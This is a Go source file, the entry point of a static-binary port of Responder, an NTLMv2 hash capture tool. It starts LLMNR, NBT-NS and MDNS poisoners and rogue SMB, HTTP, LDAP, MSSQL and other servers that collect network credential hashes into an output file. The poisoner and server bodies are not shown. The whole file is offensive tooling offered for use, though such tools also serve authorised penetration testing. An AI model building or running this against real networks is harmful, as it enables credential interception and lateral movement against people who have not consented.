package main

import (
	"flag"
	"fmt"
	"net"
	"os"
	"os/signal"
	"syscall"
)

var (
	verbose bool
	outFile string
)

const banner = `
  ██████╗  ██████╗       ██████╗ ███████╗███████╗██████╗  ██████╗ ███╗   ██╗██████╗ ███████╗██████╗
 ██╔════╝ ██╔═══██╗      ██╔══██╗██╔════╝██╔════╝██╔══██╗██╔═══██╗████╗  ██║██╔══██╗██╔════╝██╔══██╗
 ██║  ███╗██║   ██║█████╗██████╔╝█████╗  ███████╗██████╔╝██║   ██║██╔██╗ ██║██║  ██║█████╗  ██████╔╝
 ██║   ██║██║   ██║╚════╝██╔══██╗██╔══╝  ╚════██║██╔═══╝ ██║   ██║██║╚██╗██║██║  ██║██╔══╝  ██╔══██╗
 ╚██████╔╝╚██████╔╝      ██║  ██║███████╗███████║██║     ╚██████╔╝██║ ╚████║██████╔╝███████╗██║  ██║
  ╚═════╝  ╚═════╝       ╚═╝  ╚═╝╚══════╝╚══════╝╚═╝      ╚═════╝ ╚═╝  ╚═══╝╚═════╝ ╚══════╝╚═╝  ╚═╝

  NTLMv2 Hash Capture Tool — Go static implementation
  Based on Responder by Laurent Gaffie (lgandx) — https://github.com/lgandx/Responder
  Go port for air-gapped environments (zero dependencies, single static binary)
`

func main() {
	iface := flag.String("i", "", "Network interface to listen on (required)")
	flag.BoolVar(&verbose, "v", false, "Verbose output")
	flag.StringVar(&outFile, "o", "hashes.txt", "Output file for captured hashes")
	challenge := flag.String("c", "", "Fixed NTLM challenge (hex, e.g. 1122334455667788). Random if not set.")
	analyze := flag.Bool("A", false, "Analyze mode: log queries but do not poison")
	noSMB := flag.Bool("no-smb", false, "Disable SMB server")
	noHTTP := flag.Bool("no-http", false, "Disable HTTP server")
	noFTP := flag.Bool("no-ftp", false, "Disable FTP server")
	noSMTP := flag.Bool("no-smtp", false, "Disable SMTP server")
	noPOP3 := flag.Bool("no-pop3", false, "Disable POP3 server")
	noIMAP := flag.Bool("no-imap", false, "Disable IMAP server")
	noLDAP := flag.Bool("no-ldap", false, "Disable LDAP server")
	noDNS := flag.Bool("no-dns", false, "Disable DNS server/poisoner")
	noDCERPC := flag.Bool("no-dcerpc", false, "Disable DCE-RPC server")
	noMSSQL := flag.Bool("no-mssql", false, "Disable MSSQL server")
	flag.Parse()

	if *iface == "" {
		fmt.Fprintln(os.Stderr, "[-] -i <interface> is required")
		flag.Usage()
		os.Exit(1)
	}

	ip, err := getIfaceIP(*iface)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[-] Cannot get IP for interface %s: %v\n", *iface, err)
		os.Exit(1)
	}

	initSession(*challenge)
	analyzeMode = *analyze

	fmt.Print(banner)
	printStartup(ip, *noSMB, *noHTTP, *noFTP, *noSMTP, *noPOP3, *noIMAP, *noLDAP, *noDNS, *noDCERPC, *noMSSQL)

	// Poisoners
	go poisonLLMNR(ip)
	go poisonNBTNS(ip)
	go poisonMDNS(ip)
	if !*noDNS {
		go serveDNS(ip)
	}

	// Servers
	if !*noSMB {
		go serveSMB(ip)
	}
	if !*noHTTP {
		go serveHTTP(ip)
	}
	if !*noFTP {
		go serveFTP(ip)
	}
	if !*noSMTP {
		go serveSMTP(ip)
	}
	if !*noPOP3 {
		go servePOP3(ip)
	}
	if !*noIMAP {
		go serveIMAP(ip)
	}
	if !*noLDAP {
		go serveLDAP(ip)
	}
	if !*noDCERPC {
		go serveDCERPC(ip, sessionDCERPCPort)
	}
	if !*noMSSQL {
		go serveMSSQL(ip)
	}

	fmt.Println("[+] Listening for events...\n")

	sig := make(chan os.Signal, 1)
	signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)
	<-sig
	fmt.Printf("\n[*] Shutting down. Hashes saved to %s\n", outFile)
}

func printStartup(ip net.IP, noSMB, noHTTP, noFTP, noSMTP, noPOP3, noIMAP, noLDAP, noDNS, noDCERPC, noMSSQL bool) {
	on := func(disabled bool) string {
		if disabled {
			return cRed + "OFF" + cReset
		}
		return cGreen + "ON " + cReset
	}

	fmt.Printf("[+] Poisoners:\n")
	fmt.Printf("    LLMNR                      [%s]\n", on(false))
	fmt.Printf("    NBT-NS                     [%s]\n", on(false))
	fmt.Printf("    MDNS                       [%s]\n", on(false))
	fmt.Printf("    DNS                        [%s]\n", on(noDNS))
	fmt.Println()

	fmt.Printf("[+] Servers:\n")
	fmt.Printf("    SMB server                 [%s]\n", on(noSMB))
	fmt.Printf("    HTTP server                [%s]\n", on(noHTTP))
	fmt.Printf("    FTP server                 [%s]\n", on(noFTP))
	fmt.Printf("    SMTP server                [%s]\n", on(noSMTP))
	fmt.Printf("    POP3 server                [%s]\n", on(noPOP3))
	fmt.Printf("    IMAP server                [%s]\n", on(noIMAP))
	fmt.Printf("    LDAP server                [%s]\n", on(noLDAP))
	fmt.Printf("    MSSQL server               [%s]\n", on(noMSSQL))
	fmt.Printf("    DCE-RPC server             [%s]\n", on(noDCERPC))
	fmt.Println()

	fmt.Printf("[+] Generic Options:\n")
	fmt.Printf("    Responder NIC              [%s]\n", flag.Lookup("i").Value.String())
	fmt.Printf("    Responder IP               [%s]\n", ip)
	fmt.Printf("    Challenge set              [%s]\n", challengeHexStr())
	fmt.Printf("    Analyze mode               [%v]\n", analyzeMode)
	fmt.Println()

	fmt.Printf("[+] Current Session Variables:\n")
	fmt.Printf("    Responder Machine Name     [%s]\n", sessionMachineName)
	fmt.Printf("    Responder Domain Name      [%s]\n", sessionDomain)
	fmt.Printf("    Responder DCE-RPC Port     [%d]\n", sessionDCERPCPort)
	fmt.Printf("    Output file                [%s]\n", outFile)
	fmt.Println()
}

// getIfaceIP returns the first IPv4 address of the named interface.
func getIfaceIP(name string) (net.IP, error) {
	iface, err := net.InterfaceByName(name)
	if err != nil {
		return nil, err
	}
	addrs, err := iface.Addrs()
	if err != nil {
		return nil, err
	}
	for _, a := range addrs {
		var ip net.IP
		switch v := a.(type) {
		case *net.IPNet:
			ip = v.IP
		case *net.IPAddr:
			ip = v.IP
		}
		if ip4 := ip.To4(); ip4 != nil {
			return ip4, nil
		}
	}
	return nil, fmt.Errorf("no IPv4 address on interface %s", name)
}
